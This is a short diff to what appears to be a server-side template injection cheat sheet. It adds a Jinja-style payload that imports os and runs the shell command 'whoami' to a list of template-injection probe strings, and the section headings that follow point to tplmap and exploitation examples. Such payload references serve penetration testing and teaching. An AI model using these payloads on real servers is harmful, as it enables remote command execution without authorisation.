@@ -118,6 +118,7 @@ ${7*7}
 {{7*7}}
 {{7*'7'}}
 ${{<%[%'"}}%\
+{% import os %}{{os.system('whoami')}}
 ```
 ### tplmap.py
 ### SSTI Exploitation Example 1
